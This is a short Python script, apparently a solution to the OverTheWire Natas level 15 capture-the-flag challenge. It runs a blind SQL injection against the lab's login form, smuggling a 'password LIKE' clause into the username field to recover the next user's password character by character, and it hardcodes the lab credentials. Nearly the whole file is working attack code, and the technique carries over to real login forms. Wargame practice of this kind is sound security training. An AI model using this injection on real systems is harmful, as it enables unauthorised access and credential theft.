import requests
import re
from string import *

characters = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"
print(characters)

logar = ["natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"]
url = "http://%s.natas.labs.overthewire.org/"%logar[0]
session = requests.Session()

vi_a_senha = list()
while True:
    for ch in characters:
        print("Testando =>"+ch,"".join(vi_a_senha))
        r = session.post(url, data={"username":'natas16" AND password LIKE "'+"".join(vi_a_senha)+ch+'%"#'} ,auth=(logar[0],logar[1]), timeout=10)
        contento = r.text
        if "This user doesn't exist" not in contento:
            print(contento)
            vi_a_senha.append(ch)
